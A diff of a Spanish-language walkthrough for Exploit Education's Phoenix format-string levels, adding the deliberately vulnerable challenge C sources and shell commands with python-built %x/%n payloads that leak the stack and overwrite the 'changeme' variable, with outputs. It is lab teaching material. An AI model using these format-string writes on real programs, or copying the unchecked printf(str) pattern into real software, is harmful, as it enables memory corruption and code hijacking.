@@ -7,6 +7,10 @@ permalink: /Phoenix-EE/
 
 # Phoenix-Exploit Education
 
+**Todos los retos de esta pagina se extraen se la siguiente web**
+
+Link: [https://exploit.education/phoenix/](https://exploit.education/phoenix/)
+
 ## Índice
 
   * [Stack Buffer Overflow](#stack-buffer-overflow)
@@ -180,22 +184,133 @@ Well done, the 'changeme' variable has been changed correctly!
 
 ## Format Two
 
+```c
+/*
+ * phoenix/format-two, by https://exploit.education
+ *
+ * Can you change the "changeme" variable?
+ *
+ * What kind of flower should never be put in a vase?
+ * A cauliflower.
+ */
+
+#include <err.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define BANNER \
+  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
+
+int changeme;
+
+void bounce(char *str) {
+  printf(str);
+}
+
+int main(int argc, char **argv) {
+  char buf[256];
+
+  printf("%s\n", BANNER);
+
+  if (argc > 1) {
+    memset(buf, 0, sizeof(buf));
+    strncpy(buf, argv[1], sizeof(buf));
+    bounce(buf);
+  }
+
+  if (changeme != 0) {
+    puts("Well done, the 'changeme' variable has been changed correctly!");
+  } else {
+    puts("Better luck next time!\n");
+  }
+
+  exit(0);
+}
+```
+
+Como podemos ver, ahora no contamos con estructuras, pero nos dicen que tenemos que cambiar el valor de la variable **changeme**. Así que empezaremos con obtener la direccion de memoria de la variable **chageme**, para nuestro programa con el siguiente comando:
+
 ```bash
 user@phoenix-amd64:~$ nm /opt/phoenix/i486/format-two | grep changeme
 08049868 B changeme
-
-user@phoenix-amd64:~$ /opt/phoenix/i486/format-two AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
-Welcome to phoenix/format-two, brought to you by https://exploit.education
-AAAA.ffffd89c.100.0.f7f84b67.ffffd6f0.ffffd6d8.80485a0.ffffd5d0.ffffd89c.100.3e8.41414141.Better luck next time!
-
-user@phoenix-amd64:~$ /opt/phoenix/i486/format-two $(echo -e "\x68\x98\x04\x08%x%x%x%x%x%x%x%x%x%x%x%n.")
-Welcome to phoenix/format-two, brought to you by https://exploit.education
-hffffd8a81000f7f84b67ffffd700ffffd6e880485a0ffffd5e0ffffd8a81003e8.Well done, the 'changeme' variable has been changed correctly!
 ```
+
+Ahora escribimos **AAAA** seguido de una cantidad de **%x** para que el utimo numero que salga sea el hexadecimal del primer texto el cual seria el hexadecimal de **AAAA** el cual es **41414141**.
+
+```bash
+user@phoenix-amd64:/opt/phoenix/amd64$ /opt/phoenix/i486/format-two $(python -c "print 'AAAA'+'%x.'*12")
+Welcome to phoenix/format-two, brought to you by https://exploit.education
+AAAAffffd89d.100.0.f7f84b67.ffffd700.ffffd6e8.80485a0.ffffd5e0.ffffd89d.100.3e8.41414141.Better luck next time!
+```
+
+Entonces lo que haremos será quitar un **%x** y reemplazarlo por un **%n** y veremos lo que ocurre:
+
+```bash
+user@phoenix-amd64:/opt/phoenix/amd64$ /opt/phoenix/i486/format-two $(python -c "print 'AAAA'+'%x.'*11+'%n'")
+Welcome to phoenix/format-two, brought to you by https://exploit.education
+Segmentation fault
+```
+
+Entonces como puede ver, nos encontramos con un **Segmentation fault**, lo cual nos dice que se ha encontrado una direccion invalida de memoria. Esto se debe a que esta intentando sobrescribir en la direccion **0x41414141** pero esta direccion es inválida. Entonces lo que haremos será insertar la direccion de memoria de la variable **changeme** (en modo little endian).
+
+```bash
+user@phoenix-amd64:/opt/phoenix/amd64$ /opt/phoenix/i486/format-two $(python -c "print '\x08\x04\x98\x68'[::-1]+'%x.'*11+'%n'")
+Welcome to phoenix/format-two, brought to you by https://exploit.education
+hffffd89e.100.0.f7f84b67.ffffd700.ffffd6e8.80485a0.ffffd5e0.ffffd89e.100.3e8.Well done, the 'changeme' variable has been changed correctly!
+```
+
+Y como podemos ver, logramos sobrescribir el contenido de la variable **changeme**.
 
 ## Format Three
 
-Empezaremos con obtener la direccion de la variable **changeme** y luego vemos cuando **%x** hay que agregar para que salgan nuestras **AAAA**.
+```c
+/*
+ * phoenix/format-three, by https://exploit.education
+ *
+ * Can you change the "changeme" variable to a precise value?
+ *
+ * How do you fix a cracked pumpkin? With a pumpkin patch.
+ */
+
+#include <err.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define BANNER \
+  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
+
+int changeme;
+
+void bounce(char *str) {
+  printf(str);
+}
+
+int main(int argc, char **argv) {
+  char buf[4096];
+  printf("%s\n", BANNER);
+
+  if (read(0, buf, sizeof(buf) - 1) <= 0) {
+    exit(EXIT_FAILURE);
+  }
+
+  bounce(buf);
+
+  if (changeme == 0x64457845) {
+    puts("Well done, the 'changeme' variable has been changed correctly!");
+  } else {
+    printf(
+        "Better luck next time - got 0x%08x, wanted 0x64457845!\n", changeme);
+  }
+
+  exit(0);
+}
+```
+
+Este nivel es parecido al anterior, solo que ahora nos piden que sobrescribamos la variable **changeme** con un valor en especifico. Así que empezaremos con obtener la direccion de la variable **changeme** y luego vemos cuantos **%x** hay que agregar para que salgan nuestras **AAAA**.
 
 ```bash
 user@phoenix-amd64:/opt/phoenix/i486$ nm ./format-three | grep changeme
@@ -207,7 +322,7 @@ AAAA0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0 41414141
 Better luck next time - got 0x00000000, wanted 0x64457845!
 ```
 
-Ahora restamos un **%x** y lo reemplazamos por un **%n**. Tambien a su vez cambiamos las **AAAA** por la direccion de memoria de donde apunta nuestra variable **changeme**. 
+Ahora restamos un **%x** y lo reemplazamos por un **%n**. Tambien a su vez cambiamos las **AAAA** por la direccion de memoria de donde apunta nuestra variable **changeme** (en modo little endian).
 
 ```bash
 user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'%x '*12" |./format-three 
@@ -230,10 +345,10 @@ DEFG0 0 0 f7f81cf7 f7ffb000 ffffd738 8048556 ffffc730 ffffc730 fff 0
 Better luck next time - got 0x00000051, wanted 0x64457845!
 ```
 
-Como podemos ver, se a desplazado los bytes, por ello, lo que haremos será usar esta informacion para desplazar caracteres usando **A**. Haciendo un pequeño calculo, necesitamos saber cuantas **A** se necesita agregar para que 45 llegue a 51, entonces hariamos una pequeña resta de 45-51, pero como esto nos da una resta negativa, pero si sobrepasa el byte no nos importa puesto que eso podemos arreglarlo en el siguiente byte. Entonces haremos la resta de 145-51.
+Como podemos ver, se a desplazado los bytes, por ello, lo que haremos será usar esta informacion para desplazar caracteres usando **A**. Haciendo un pequeño calculo, necesitamos saber cuantas **A** se necesita agregar para que 45 llegue a 51, entonces hariamos una pequeña resta de 45-51, pero como esto nos da una resta negativa entonces no tenemos que hacer exactamente esta resta, notamos que si sobrepasa el byte no nos importa puesto que eso podemos arreglarlo en el siguiente byte. Entonces haremos la resta de 145-51 (considerando que son numeros en hexadecimal).
 
 ```bash
->>> int("145",16)-int("51",16)
+>>> int("145",16)-int("51",16) #Codigo en consola de python
 244
 
 user@phoenix-amd64:/opt/phoenix/i486$ python -c "print '\x08\x04\x98\x44'[::-1]+'\x08\x04\x98\x45'[::-1]+'\x08\x04\x98\x46'[::-1]+'\x08\x04\x98\x47'[::-1]+'%x '*11+'A'*244+'%n'" |./format-three 
@@ -298,8 +413,6 @@ Well done, the 'changeme' variable has been changed correctly!
 ```
 
 ## Format Four
-
-El siguiente codigo:
 
 ```c
 /*
